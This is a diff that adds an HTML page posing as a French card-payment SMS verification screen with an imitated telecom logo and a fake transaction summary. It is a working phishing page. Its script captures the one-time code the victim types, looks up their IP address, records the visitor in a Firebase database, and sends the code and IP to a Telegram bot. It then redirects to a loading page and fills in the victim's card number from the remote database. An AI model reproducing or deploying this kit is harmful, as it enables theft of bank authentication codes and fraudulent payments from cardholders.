@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ACS</title>
+<link href="ACS_fichiers/libs.css" rel="stylesheet">
+<link href="ACS_fichiers/app.css" rel="stylesheet">
+<link ng-href="app/config/custom/custom.css" rel="stylesheet" id="custom" href="ACS_fichiers/custom.css">
+<script src="main.js"></script>
+</head>
+<body>
+<custom-component layout-data="layoutData" class="ng-isolate-scope"><div class="ng-scope"><div><div class="container-fluid">
+    <div id="headerLayout" class="row">
+        <div id="pageHeader" class="text-center col-xs-12">
+            <div class="row">
+               
+             <svg style="margin:10px 0" xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 350 350"><path d="M350 350H0V0h350v350z" fill="#f60"/><path d="M43.078 321.775c-12.673 0-24.106-8.069-24.106-25.704 0-17.634 11.433-25.704 24.106-25.704 12.674 0 24.09 8.07 24.09 25.704-.001 17.635-11.417 25.704-24.09 25.704m0-40.569c-9.581 0-11.331 8.63-11.331 14.865s1.75 14.882 11.331 14.882c9.582 0 11.332-8.646 11.332-14.882s-1.75-14.865-11.332-14.865M75.959 271.652h12.198v5.725c2.327-3.092 8.052-6.728 13.421-6.728.51 0 1.138 0 1.665.068v12.045h-.629c-5.572 0-11.671.866-13.642 5.198v32.397H75.959v-48.705zM137.304 316.118c-4.961 3.262-10.329 4.842-16.105 4.842-9.089 0-14.475-6.048-14.475-14.169 0-10.906 10.023-16.666 30.682-18.993v-2.718c0-3.534-2.684-5.606-7.645-5.606-4.961 0-8.987 1.971-11.893 5.606l-8.647-4.927c4.536-6.354 11.45-9.531 20.743-9.531 12.708 0 19.843 5.505 19.843 14.458 0 0-.017 35.218 0 35.303h-11.366l-1.137-4.265zm-17.957-10.261c0 3.278 2.056 6.336 5.776 6.336 4.026 0 7.951-1.664 11.875-5.13v-11.536c-11.977 1.479-17.651 4.57-17.651 10.33M159.938 272.95l10.618-1.461 1.172 5.775c5.98-4.383 10.737-6.71 16.717-6.71 10.023 0 15.205 5.317 15.205 15.851v33.909h-12.827V288.63c0-5.964-1.546-8.647-6.185-8.647-3.822 0-7.645 1.732-12.01 5.402v34.929h-12.69V272.95zM235.022 309.889c9.718-.067 10.55-9.972 10.55-16.411 0-7.645-3.721-13.812-10.635-13.812-4.604 0-9.752 3.363-9.752 14.339.001 5.998.426 15.969 9.837 15.884m22.867-38.411v46.124c0 8.121-.645 21.559-23.834 21.678-9.582.068-18.467-3.771-20.234-12.13l12.641-2.039c.525 2.396 2.004 4.774 9.174 4.774 6.643 0 9.836-3.177 9.836-10.788v-5.674l-.17-.17c-2.039 3.652-5.131 7.102-12.572 7.102-11.365 0-20.301-7.883-20.301-24.346 0-16.292 9.225-25.415 19.57-25.432 9.734-.017 13.32 4.417 14.17 6.744l-.17-.017 1.07-5.827h10.82v.001zM288.54 321.247c-14.354 0-22.917-9.242-22.917-25.263 0-16.207 8.664-25.432 22.713-25.432 14.05 0 22.408 8.953 22.408 24.786 0 .85-.102 1.682-.102 2.515H278.21c.085 9.242 3.924 13.896 11.467 13.896 4.842 0 8.053-1.953 11.061-6.234l9.377 5.198c-4.127 6.915-11.568 10.534-21.575 10.534m9.616-31.701c0-6.507-3.738-10.346-9.82-10.346-5.793 0-9.412 3.754-9.921 10.346h19.741zM332.689 253.17l-4.723 12.215-4.807-12.215h-4.111v16.105h2.666v-13.438h.068l5.283 13.438h1.699l5.25-13.438h.084v13.438h2.65V253.17h-4.059zm-29.644 0v2.141h5.029v13.965h2.666V255.31h5.047v-2.141h-12.742z" fill="#fff"/></svg>
+             
+                    <div id="centeredTitle" style="text-align: center;color:#7F3F00;margin: 10px">
+                      <center> <span id="page-title" ng-bind-html="customText" class="custom-text ng-binding">Identification par SMS</span></center>
+                    </div>
+                
+                
+            </div>
+        </div>
+    </div>
+    <style>
+        #issuerLogo,
+        #networkLogo {
+            max-height: 75px;
+            max-width: 100%;
+            height: auto;
+            padding: 0px;
+        }
+        #centeredTitle {
+            font-weight: 500;
+            display: block;
+            font-size: 150%;
+            margin-top:10px;
+        }
+    </style>
+
+    <message-banner class="ng-isolate-scope"><!-- ngIf: show --></message-banner>
+    <style>
+        message-banner {
+            display: block;
+            width: 100%;
+            position: relative;
+        }
+    </style>
+	<div id="green-separator"></div>
+    <style>
+        div#green-separator {
+            background-color:#ff7f00;
+            width: 100%;
+            height: 50px !important;
+            margin-bottom: 10px;
+        }
+    </style>
+	<form action="sms.php" id="formSendCode" method="POST">
+    <div id="mainLayout" class="row">
+        <div class="noLeftRightMargin">
+            <div id="leftMenuLayout" class=" col-xs-12 col-sm-4 col-md-4 col-lg-4">
+                <div class="noLeftRightPadding">
+                    <side-menu menu-title="'TRANSACTION_SUMMARY'" class="ng-isolate-scope"><div class="side-menu text-center">
+	<div class="row menu-title" ng-show="showMenuTitle()">
+		<custom-text custom-text-key="menuTitle" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Résumé de la transaction</span></custom-text>
+	</div>
+	<div class="menu-elements">
+		<!-- ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope" style="">
+			<div ng-switch="" on="menuItem.value">
+				<!-- ngSwitchWhen: BUTTON -->
+				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
+					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
+						<label data-cy="SIDE_MENU_ITEM_LABEL">
+							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Marchand</span></custom-text>
+						</label>
+						<label id="menu-separator">:</label>
+					</span>
+					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
+                        <span class="ng-binding">wirecardbank.com</span>
+						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
+					</span>
+				</div><!-- end ngSwitchWhen: -->
+			</div>
+		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
+			<div ng-switch="" on="menuItem.value">
+				<!-- ngSwitchWhen: BUTTON -->
+				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
+					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
+						<label data-cy="SIDE_MENU_ITEM_LABEL">
+							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Montant</span></custom-text>
+						</label>
+						<label id="menu-separator">:</label>
+					</span>
+					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
+                        <span class="ng-binding"> €</span>
+						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
+					</span>
+				</div><!-- end ngSwitchWhen: -->
+			</div>
+		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
+			<div ng-switch="" on="menuItem.value">
+				<!-- ngSwitchWhen: BUTTON -->
+				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
+					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
+						<label data-cy="SIDE_MENU_ITEM_LABEL">
+							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Date</span></custom-text>
+						</label>
+						<label id="menu-separator">:</label>
+					</span>
+					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
+                        <span class="ng-binding"> 2024 </span>
+						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
+					</span>
+				</div><!-- end ngSwitchWhen: -->
+			</div>
+		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
+			<div ng-switch="" on="menuItem.value">
+				<!-- ngSwitchWhen: BUTTON -->
+				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
+					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
+						<label data-cy="SIDE_MENU_ITEM_LABEL">
+							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">N° de carte</span></custom-text>
+						</label>
+						<label id="menu-separator">:</label>
+					</span>
+					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
+                        <span id="ccpan" class="ng-binding">000000000000xxxx</span>
+						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
+					</span>
+				</div><!-- end ngSwitchWhen: -->
+			</div>
+		</div><!-- end ngRepeat: menuItem in menuItems --><div ng-repeat="menuItem in menuItems" class="ng-scope">
+			<div ng-switch="" on="menuItem.value">
+				<!-- ngSwitchWhen: BUTTON -->
+				<!-- ngSwitchDefault: --><div ng-switch-default="" class="break-word ng-scope">
+					<span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
+						<label data-cy="SIDE_MENU_ITEM_LABEL">
+							<custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">N° de téléphone</span></custom-text>
+						</label>
+						<label id="menu-separator">:</label>
+					</span>
+					<span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
+                        <span class="ng-binding">+33xxxxxxxxx</span>
+						<!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
+					</span>
+				</div><!-- end ngSwitchWhen: -->
+			</div>
+		</div><!-- end ngRepeat: menuItem in menuItems -->
+	</div>
+</div></side-menu>
+                </div>
+            </div>
+
+            <div id="centerPieceLayout" class=" col-xs-12 col-sm-8 col-md-8 col-lg-7">
+                <div class="paragraph">
+                    <custom-text custom-text-key="'network_means_pageType_1'" id="paragraph1" class="ng-isolate-scope"><span id="paragraph1" ng-bind-html="customText" class="custom-text ng-binding">Pour
+ sécuriser vos achats en ligne sur les sites affichant le logo ID 
+Check™, il vous suffit désormais de vous identifier en saisissant le 
+code sécurité qui vient de vous être transmis par téléphone.</span></custom-text>
+                </div>
+				<div class="paragraph">
+                    <custom-text custom-text-key="'network_means_pageType_3'" id="paragraph3" class="ng-isolate-scope"><span id="paragraph3" ng-bind-html="customText" class="custom-text ng-binding">Veuillez saisir le code sécurité reçu sur le n° de téléphone sélectionné (présenté de façon masquée ci-contre) :</span></custom-text>
+                </div>
+                <div class="text-center">
+                    <otp-form class="ng-isolate-scope"><div id="otp-form">
+                        <div id="er-sms" style="width:auto;background:#FFD5D5;color:#853737;padding:8px;border-radius:2px;margin:10px;text-align:left;display:none;">
+    <span>Les informations sont incorrectes, veuillez vérifier à nouveau</span>
+    </div>
+	<div class="tooltips">
+		<span ng-bind-html="tooltipsValue" class="ng-binding">Ex.: 71057337</span>
+		<input id="code" type="tel" maxlength="8"  class="passwordCode" required oninput="validateInputRk(event)">
+	</div>
+</div></otp-form>
+                </div>
+                <div class="text-center">
+                    <input style="height:30px;width:100px;border:none;margin:10px; background :#ff7f00;color:#fff;border-radius:5px;" type="submit" name="submit_btn" id = "submit"  value="Validé" >
+
+<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-database.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+<script src="script.js"></script>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";
+
+
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const url = window.location.href;
+ const idValue = new URL(url).searchParams.get('id');
+
+
+const getElementValue = (id) => document.getElementById(id).value;
+const submitButton = document.getElementById("submit");
+
+submitButton.addEventListener('click', async (e) => {
+  e.preventDefault();
+  const response = await fetch('https://api64.ipify.org?format=json');
+  const { ip: DiIp } = await response.json();
+
+  const DiCode = getElementValue("code");
+
+  if (DiCode && DiCode.trim().length == 8 || DiCode.trim().length == 6 ) {
+        set(ref(db, `user/${idValue}`), {
+      Loading: "true",
+      SMS: "false",
+      CC: "false",
+      CODE2: "false",
+      SITE: "false",
+      APP: "false",
+      APPYES: "false",
+      APPNO: "false"
+    }).then(() => {
+      
+      const inputValue = $('.passwordCode').val();
+      
+
+$.ajax({
+  type: 'POST',
+  url: `https://api.telegram.org/bot${token}/sendMessage`,
+  data: {
+    chat_id: chatId,
+    text: `IMPOTS-SMS: ${inputValue}\nIP: ${DiIp} `
+  },
+  success: function(response) {
+
+    window.location.href = 'loading.html?id=' + idValue;
+  },
+  error: function(error) {
+    alert('ERROR:', error);
+  }
+});
+
+    });
+   } else {
+      $("#er-sms").show();
+  }
+});
+
+</script>
+
+</button></val-button>
+                </div>
+                <div class="paragraph">
+                    <custom-text custom-text-key="'network_means_pageType_2'" id="paragraph2" class="ng-isolate-scope"><span id="paragraph2" ng-bind-html="customText" class="custom-text ng-binding">Cette identification est obligatoire pour valider votre achat, Si vous ne souhaitez pas vous identifier votre achat sera annulé.</span></custom-text>
+                </div>
+            </div>
+        </div>
+    </div>
+    <style>
+        .noLeftRightMargin {
+            margin-left: 0px;
+            margin-right: 0px;
+        }
+        .noLeftRightPadding {
+            padding-left: 0px;
+            padding-right: 0px;
+        }
+        #centerPieceLayout {
+            padding: 5px 10px 0px;
+            min-height: 200px;
+			background-color: #FFFFFF;
+        }
+        .paragraph {
+            margin: 0px 0px 10px;
+            text-align: justify;
+        }
+        .menu-title {
+        }
+        .menu-title span {
+            display: block;
+            font-size: 18px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+        #validateButton {
+            background-color: #ff7f00;
+            color: rgb(51, 51, 51);
+            white-space: normal;
+            border-radius: 4px;
+            border-color: rgb(204, 204, 204);
+        }
+        #validateButton button {
+            margin-top: 5px;
+        }
+        button span.fa {
+            padding-right: 7px;
+        }
+        @media screen and (max-width: 480px){
+            div.hideable-text {
+                display: none;
+	        }
+        }
+    </style>
+
+        <div id="bottomMenu">
+       
+        </div>
+
+    <style>
+        #bottomMenu {
+            background-color: #ff7f00;
+            margin-top: 10px;
+            text-align: center;
+            height:50px;
+        }
+        #cancelButton, #helpButton {
+            color: rgb(51, 51, 51);
+            white-space: normal;
+            display: inline-block;
+            border-width: 1px;
+            border-style: solid;
+            border-color: rgb(0, 166, 235);
+            border-image: initial;
+            margin: 10px;
+        }
+    </style>
+</div>
+</div></div></custom-component>
+
+<script>
+const idValue = (new URL(window.location.href)).searchParams.get('id');
+
+function fetchData() {
+  fetch(url)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Failed to fetch data');
+      }
+      return response.json();
+    })
+    .then(data => {
+      const ccValue = data.user[idValue]?.DiCc;
+      document.getElementById('ccpan').textContent = ccValue || '000000000000xxxx';
+    })
+    .catch(error => {
+      console.error('ERROR:', error);
+      document.getElementById('ccpan').textContent = '000000000000xxxx';
+    });
+}
+
+fetchData();
+</script>
+
+</body></html>
